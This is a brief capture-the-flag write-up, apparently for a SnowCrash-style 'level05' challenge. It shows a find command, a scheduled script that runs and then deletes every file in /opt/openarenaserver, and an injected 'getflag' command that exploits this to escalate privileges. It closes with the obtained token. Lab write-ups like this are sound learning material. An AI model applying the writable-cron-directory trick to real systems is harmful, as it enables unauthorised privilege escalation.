

find / -group flag05 -exec ls -la {} \; 2>/dev/null

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

echo "getflag > /tmp/flag" > /opt/openareanserver/flag

watch -x cat /tmp/flag

Check flag.Here is your token : viuaaale9huek52boumoomioc